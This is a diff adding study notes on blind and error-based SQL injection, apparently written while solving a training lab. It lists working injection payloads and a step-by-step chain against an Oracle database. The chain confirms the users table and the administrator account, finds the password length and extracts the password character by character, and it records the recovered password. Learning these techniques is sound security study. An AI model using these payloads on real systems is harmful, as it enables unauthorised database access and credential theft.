@@ -174,5 +174,80 @@ scliTLUSpsZWWON5' and (select password from users where username='administrator'
 scliTLUSpsZWWON5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--';    # Password more then 1 character
 scliTLUSpsZWWON5' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'   #  Brute force this 1 to 50 it will return the 20, 19 we are getting welcome back message
 scliTLUSpsZWWON5' and (select substring(password,1,1) from users where username='administrator')='a'--'   # trying password string with 'a'
-# Either use Burp Professional or python above script
+# Either use Burp Professional or Python above script
+```
+
+### Error-based SQL Injection
+- Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.
+- The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
+    -  You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as a conditional response we looked at in the previous section.
+    -  You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise bliend SQL injection vulnerabilities into visible ones.  
+
+##### Exploiting blind SQL injection by triggering conditional errors
+- Some parameters in applications including username, password, id, trackingID and sessionID might be vulnerable to SQL quires but the behaviour doesn't change, regardless of whether the query returns any data.
+- Injecting boolean conditions makes no difference to the application's response.
+```bash
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+- These inputs use the ```CASE``` keyword to test a condition and return a different expression depending on whether the expression is true:
+    - With the first, the ```CASE```  expression evaluates to 'a', which does not cause any error.
+    - With the secound input, it evaluates to ```1/0```, which causes a divide-by-zero error.
+- Conditions is
+```bash
+' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
+if admin exists -> condition 1=1 evaluted -> 1/0 evaluted -> Error
+if random doesn't exists -> condition 1=1 never evaluted -> 1/0  never evaluted -> NO Error
+```
+- Conditions is
+        - Determine the data FROM dual table
+        - Validate the condition CASE WHEN(1=0). Since 1=0 is always false,
+        - TO_CHAR(1/0) never evaluated therefore no error
+```bash
+Vulnerable parameter - tracking cookie
+
+End Goals:
+- Output the administrator password
+- Login as the administrator user
+
+Analysis:
+
+1) Prove that parameter is vulnerable
+
+' || (select '' from dual) || ' -> oracle database 200
+
+' || (select '' from dualfiewjfow) || ' -> error 500
+
+2) Confirm that the users table exists in the database
+
+' || (select '' from users where rownum =1) || '  -> 200
+-> users table exists
+
+3) Confirm that the administrator user exists in the users table  -> 200
+' || (select '' from users where username='administrator') || ' -> 200
+' || (select '' from users where username='Unknown') || ' -> 200, We can't decide whether particular user available or not
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error -> administrator user exists
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+-> 200 response -> user does not exist in database
+
+4) Determine length of password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 
+-> 200 response at 50 -> length of password is less than 50
+-> 20 characters
+
+5) Output the administrator password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
+-> w is not the first character of the password
+
+wjuc497wl6szhbtf0cbf
+
+
+script.py <url>
 ```
